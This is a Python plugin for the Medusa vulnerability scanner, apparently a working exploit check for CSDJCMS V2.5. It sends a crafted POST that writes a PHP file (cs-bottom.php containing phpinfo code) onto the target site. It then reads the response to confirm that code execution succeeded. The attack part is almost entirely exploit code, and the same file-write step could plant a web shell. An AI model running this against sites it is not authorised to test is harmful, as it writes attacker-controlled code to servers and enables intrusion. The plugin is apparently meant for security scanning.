#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling


class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['createDate'] = "2020-02-15"  # 插件编辑时间
        self.info['disclosure']= "2013-04-11"#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CSDJCMSGetshell1" # 插件名称
        self.info['name'] = "CSDJCMSGetshell1" #漏洞名称
        self.info['affects'] = "CSDJCMS"  # 漏洞组件
        self.info['desc_content'] = "CSDJCMSV2.5admin_loginstate.php文件中,如果s_login的值等于四个cookie相加的md5加密,即可直接通过验证"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "CSDJCMS(程氏舞曲管理系统)V2.5"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload_url = url
        referer = url

        Headers["Referer"]= "{}/admin/admin_t ... ;file=artindex.html".format(referer)
        Headers["Connection"]= "keep-alive"
        Headers["Content-Type"]= "application/x-www-form-urlencoded"
        Headers["Content-Length"]="169"
        data = "name=cs-bottom.php&content=%3C%3Fphp+phpinfo%28%29+%3F%3E"
        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies,timeout=6, verify=False)
        con = resp.text
        if con.find('PHP Version') != -1 and con.find('System')!=-1 and con.find('Configure Command') != -1:
            Medusa = "{}存在CSDJCMSGetshell\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类